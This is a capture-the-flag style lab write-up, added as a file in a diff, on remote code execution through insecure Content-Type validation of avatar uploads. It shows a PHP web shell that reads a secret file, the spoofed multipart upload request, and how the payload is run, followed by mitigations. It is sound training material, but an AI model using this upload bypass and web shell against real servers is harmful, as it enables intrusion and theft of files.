@@ -1,0 +1,75 @@
+Remote Code Execution via Insecure Content-Type Validation
+
+Lab Difficulty: Apprentice
+Vulnerability Type: File Upload / Remote Code Execution (RCE)
+
+
+Summary
+This lab illustrates a classic case of insecure file upload handling, where the server relies solely on the Content-Type specified in the HTTP request to validate the file type.
+An attacker can bypass this validation and upload a malicious PHP file disguised as an image, leading to remote code execution.
+
+Objective
+Upload a PHP web shell by manipulating the content type during file upload. Use it to read the contents
+of /home/carlos/secret and submit the extracted secret to complete the lab.
+
+Technical Walkthrough
+1. Reconnaissance
+Logged in using the provided credentials: wiener:peter
+
+Navigated to the account profile section, which includes an avatar upload feature
+
+Uploaded a standard .jpg file and confirmed it was served via:
+
+GET /files/avatars/<filename>.jpg
+This revealed that uploaded files are publicly accessible and stored in the /files/avatars/ directory.
+
+2. Creating the Web Shell
+Created a PHP script named exploit.php with the following content:
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+This payload reads the contents of Carlos’s secret file and displays it when executed.
+
+3. Uploading the Web Shell
+Located the POST /my-account/avatar request that handles avatar uploads
+
+Sent the request to Burp Repeater for editing
+
+Modified the multipart form data as follows:
+
+Modified Upload Request:
+
+POST /my-account/avatar HTTP/1.1  
+Host: <LAB-ID>.web-security-academy.net  
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary  
+
+------WebKitFormBoundary  
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"  
+Content-Type: image/jpeg  
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>  
+------WebKitFormBoundary--  
+The server accepted the upload and returned a 200 OK response, indicating the file was saved despite the extension.
+
+4. Executing the Payload
+Navigated to the uploaded script using:
+
+GET /files/avatars/exploit.php HTTP/1.1  
+Host: <LAB-ID>.web-security-academy.net  
+The response contained the contents of the target file:
+
+h8Yk3V...<redacted>...
+Result
+The extracted secret was submitted through the lab interface. The challenge was successfully completed.
+
+Mitigation
+To prevent similar vulnerabilities in real-world applications:
+
+Do not rely solely on user-controlled Content-Type headers for validation
+
+Enforce strict file extension and MIME type checks on the server side
+
+Store uploaded files outside the web root or disable execution in upload directories
+
+Rename uploaded files and strip dangerous metadata
+
+Use security headers and sandboxing techniques to reduce risk of code execution
